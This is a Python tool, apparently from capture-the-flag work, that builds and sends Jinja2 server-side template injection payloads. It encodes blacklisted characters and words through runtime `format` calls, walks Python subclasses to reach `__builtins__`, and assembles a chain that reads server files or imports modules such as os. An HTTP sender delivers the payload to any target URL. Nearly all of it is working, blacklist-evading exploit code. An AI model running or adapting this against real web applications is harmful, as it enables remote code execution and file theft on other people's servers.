#!/usr/bin/env python3
"""Jinja2 SSTI payload builder that dodges a character AND word blacklist.

Ported and generalised from the Redlimit CTV tooling (jf.py). The original was
locked to one host:port and one fixed blacklist; this takes both as arguments.

The trick: every banned literal is produced at RUNTIME by Jinja's `%`-format
inside the template, so the raw request body never contains the banned text.

    S("__globals__")  ->  "%c%c%s%s..."|format(95, 95, "g", "l", ...)

Usage:
  ssti-payload.py --expr '()|attr(__class__)|attr(__base__)'            # print payload
  ssti-payload.py --chain --url http://host:4003/ --field name          # build RCE chain
  ssti-payload.py --expr '<expr>' --url ... --field name --send         # audit + send

Default blacklist (override with --banned-chars / --banned-words):
  chars: . _ [ ] + ~
  words: application os popen read txt globals getitem builtins import

As a library:
  from ssti_payload import S, A, GA, P, builtins_, readfile, mod_attr, audit
"""
from __future__ import annotations

import argparse
import html
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# characters that may not appear literally anywhere in the payload
BANNED_CHARS = "._[]+~"
# substrings that may not appear literally anywhere in the payload
BANNED_WORDS = ("application", "os", "popen", "read", "txt",
                "globals", "getitem", "builtins", "import")


def S(t: str) -> str:
    """Jinja expression (no braces) evaluating to the literal string `t`."""
    pat, args = [], []
    for ch in t:
        if ch in BANNED_CHARS:
            pat.append("%c")
            args.append(str(ord(ch)))
        else:
            pat.append("%s")
            args.append('"%s"' % ch)
    if not pat:
        return '""'
    return '"%s"|format(%s)' % ("".join(pat), ", ".join(args))


def A(obj: str, *names: str) -> str:
    """Real-attribute chain via |attr (getattr only; no __getitem__ fallback)."""
    for n in names:
        obj = "%s|attr(%s)" % (obj, S(n))
    return obj


def GA(obj: str, key: str) -> str:
    """Bracket-free dict-key access: `obj` must be a dict -> obj.get(key)."""
    return "(%s|attr(%s))(%s)" % (obj, S("get"), key)


def call(fn: str, *args: str) -> str:
    return "(%s)(%s)" % (fn, ", ".join(args))


def C(expr: str) -> str:
    return "{%s}" % expr            # control block, e.g. {% for .. %}


def P(expr: str) -> str:
    return "{{%s}}" % expr          # print block


def walk(entry: str = "()", want: str = "catch_warnings") -> str:
    """Expression yielding the `want` subclass of object."""
    base = A(entry, "__class__", "__base__")
    subs = call(A(base, "__subclasses__"))
    return '%s|selectattr(%s,"equalto",%s)|first' % (subs, S("__name__"), S(want))


def gdict(entry: str = "()", want: str = "catch_warnings") -> str:
    """Expression yielding the __globals__ dict of <want>.__init__."""
    return A(A(walk(entry, want), "__init__"), "__globals__")


def builtins_(entry: str = "()", want: str = "catch_warnings") -> str:
    """Expression yielding __builtins__ (module OR dict, resolved via .get)."""
    return GA(gdict(entry, want), S("__builtins__"))


def opener(bi: str) -> str:
    """builtins.open, reachable whether __builtins__ is a module or a dict."""
    return GA(bi, S("open"))


def importer(bi: str) -> str:
    """builtins.__import__."""
    return GA(bi, S("__import__"))


def readfile(bi: str, path: str) -> str:
    f = call(opener(bi), S(path))
    return call(A(f, "read"))


def mod_attr(bi: str, modname: str, *attrs: str) -> str:
    """e.g. mod_attr(bi, "os", "listdir") -> the os.listdir function."""
    return A(call(importer(bi), S(modname)), *attrs)


def rce_chain(read_path: str = "/flag.txt", entry: str = "()",
              want: str = "catch_warnings") -> str:
    """Full read-a-file chain, blacklist-safe."""
    bi = builtins_(entry, want)
    return P(readfile(bi, read_path))


# ---------------------------------------------------------------- audit/send
def audit(payload: str, banned_chars: str = BANNED_CHARS,
          banned_words=BANNED_WORDS) -> str:
    """Fail loudly if the payload itself contains a blocked character/word."""
    bad = [f"{ch!r}@{i}" for i, ch in enumerate(payload) if ch in banned_chars]
    if bad:
        raise AssertionError(f"payload leaks blocked chars: {bad}")
    for w in banned_words:
        if w in payload:
            raise AssertionError(f"payload leaks blocked word {w!r}")
    return payload


def probe(url: str, payload: str, path: str = "/", formfield: str = "name",
          method: str = "POST", timeout: int = 25):
    """Send one payload. Returns (status, body)."""
    target = url.rstrip("/") + path
    if method == "GET":
        sep = "&" if "?" in target else "?"
        target += sep + urllib.parse.urlencode({formfield: payload})
        req = urllib.request.Request(target)
    else:
        req = urllib.request.Request(
            target, data=urllib.parse.urlencode({formfield: payload}).encode(),
            method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                    # noqa: BLE001
        return -1, str(e)


def extract(body: str) -> str:
    """Pull the interesting slice out of a generic response."""
    b = re.sub(r"<style>.*?</style>", "", body, flags=re.S)
    for pat in (r"<div class=['\"]card['\"]>(.*?)</div>",
                r"<div class=['\"]error['\"]>(.*?)</div>",
                r"<div class=['\"]flash[^\"]*['\"]>(.*?)</div>",
                r"<div class=['\"]alert[^\"]*['\"]>(.*?)</div>",
                r"<pre>(.*?)</pre>"):
        m = re.search(pat, b, re.S)
        if m:
            return html.unescape(re.sub(r"<[^>]+>", "", m.group(1))).strip()[:400]
    return b[:400].replace("\n", " ")


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    src = p.add_mutually_exclusive_group()
    src.add_argument("--expr", help="raw Jinja expression (no braces)")
    src.add_argument("--chain", action="store_true", help="build the full RCE read chain")
    src.add_argument("--list", action="store_true", help="print the built-in chain")
    p.add_argument("--read", default="/flag.txt", help="file to read for --chain")
    p.add_argument("--class", dest="klass", default="catch_warnings",
                   help="subclass used to reach __globals__")
    p.add_argument("--url", help="target base url, e.g. http://host:4003/")
    p.add_argument("--path", default="/")
    p.add_argument("--field", default="name")
    p.add_argument("--method", default="POST")
    p.add_argument("--send", action="store_true", help="audit then send (needs --url)")
    p.add_argument("--no-audit", action="store_true")
    p.add_argument("--banned-chars", default=BANNED_CHARS)
    p.add_argument("--banned-words", default=",".join(BANNED_WORDS))
    a = p.parse_args(argv)

    words = tuple(w for w in a.banned_words.split(",") if w)

    if a.list:
        print(rce_chain(a.read, want=a.klass))
        return 0
    if a.chain:
        payload = rce_chain(a.read, want=a.klass)
    elif a.expr:
        payload = P(a.expr)
    else:
        p.error("one of --expr / --chain / --list is required")

    if not a.no_audit:
        audit(payload, a.banned_chars, words)
        print("[audit] clean: no banned char/word in payload", file=sys.stderr)

    if a.send or a.url:
        if not a.url:
            p.error("--send needs --url")
        st, body = probe(a.url, payload, a.path, a.field, a.method)
        print(f"[{st}] {extract(body)}")
    print(payload)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
